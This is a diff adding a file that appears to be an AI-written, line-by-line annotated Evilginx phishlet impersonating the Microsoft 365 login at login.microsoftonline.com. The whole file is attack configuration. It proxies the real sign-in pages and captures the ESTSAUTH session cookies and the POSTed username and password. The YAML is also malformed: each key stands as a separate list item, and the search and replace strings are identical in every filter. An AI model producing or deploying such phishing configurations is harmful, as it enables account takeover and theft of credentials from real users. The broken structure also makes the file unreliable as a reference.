@@ -1,0 +1,146 @@
+Here is an expanded explanation of the Microsoft 365 phishlet example line by line:
+
+# Name of the phishlet for identification
+name: 'microsoft 365'
+
+# Specifies minimum Evilginx version required for compatibility 
+min_ver: '3.0.0' 
+
+# Defines hosts to be proxied between visitor and legitimate websites
+proxy_hosts:
+
+  # The subdomain that will be used for the phishing hostname
+  - phish_sub: 'login'
+
+  # The original Microsoft subdomain that is being mimicked
+  - orig_sub: 'login'
+
+  # The original Microsoft domain that is being mimicked
+  - domain: 'microsoftonline.com' 
+
+  # Enable session cookie capture for this host
+  - session: true
+
+  # Indicates this host will be used for the phishing landing page URL
+  - is_landing: true
+
+  # Second entry for another host to proxy
+  - phish_sub: 'account'
+
+  - orig_sub: 'account' 
+
+  - domain: 'microsoftonline.com'
+
+  - session: false # Disable cookie capture for this host
+
+  - is_landing: false # Not the landing page
+
+# Defines filters to modify proxied website content  
+sub_filters:
+
+  # Hostname that triggers this filter
+  - triggers_on: 'login.microsoftonline.com'
+
+  # Original subdomain to find and replace
+  - orig_sub: 'login'
+
+  # Original domain to find and replace
+  - domain: 'microsoftonline.com'
+
+  # Search regex to find strings in responses
+  - search: 'https://{hostname}/ppsecure/'
+
+  # Replacement string for matches
+  - replace: 'https://{hostname}/ppsecure/'
+
+  # MIME types that trigger filter
+  - mimes: ['text/html', 'application/json', 'application/javascript']
+
+  # Next filter entry
+  - triggers_on: 'login.microsoftonline.com'
+
+  - orig_sub: 'login'
+
+  - domain: 'microsoftonline.com'
+
+  - search: 'https://{hostname}/GetCredentialType.srf'
+
+  - replace: 'https://{hostname}/GetCredentialType.srf'
+
+  - mimes: ['text/html', 'application/json', 'application/javascript']
+
+  # Next filter entry
+  - triggers_on: 'login.microsoftonline.com'
+
+  - orig_sub: 'login'
+
+  - domain: 'microsoftonline.com'
+
+  - search: 'https://{hostname}/GetSessionState.srf'
+
+  - replace: 'https://{hostname}/GetSessionState.srf'
+
+  - mimes: ['text/html', 'application/json', 'application/javascript']
+
+  # Next filter entry
+  - triggers_on: 'login.microsoftonline.com'
+
+  - orig_sub: 'login'
+
+  - domain: 'microsoftonline.com'
+
+  - search: 'href="https://{hostname}'
+
+  - replace: 'href="https://{hostname}'
+
+  - mimes: ['text/html', 'application/json', 'application/javascript']
+
+  # Next filter entry
+  - triggers_on: 'login.microsoftonline.com'
+
+  - orig_sub: 'login'
+
+  - domain: 'microsoftonline.com'
+
+  - search: 'https://{hostname}'
+
+  - replace: 'https://{hostname}'
+
+  - mimes: ['text/html', 'application/json', 'application/javascript']
+
+  - redirect_only: true # Only on redirected URLs
+
+# Defines session cookies to capture  
+auth_tokens:
+
+  # Domain to capture cookies from
+  - domain: '.login.microsoftonline.com'
+
+  # Names of cookies to capture
+  - keys: ['ESTSAUTH:always' , 'ESTSAUTHPERSISTENT' , 'SignInStateCookie:always']
+
+  - type: 'cookie' # Indicates cookie capture
+
+# Specifies credentials POST data to capture
+credentials:
+
+  # POST parameter name for username 
+  - key: 'login'
+
+  - search: '(.*)' # Regex to extract value
+
+  - type: 'post' # POST data
+
+  # POST parameter for password
+  - key: 'passwd'
+
+  - search: '(.*)'
+
+  - type: 'post'
+
+# Sets domain and path of the login page  
+login:
+
+  - domain: 'login.microsoftonline.com'
+
+  - path: '/?auth=2'
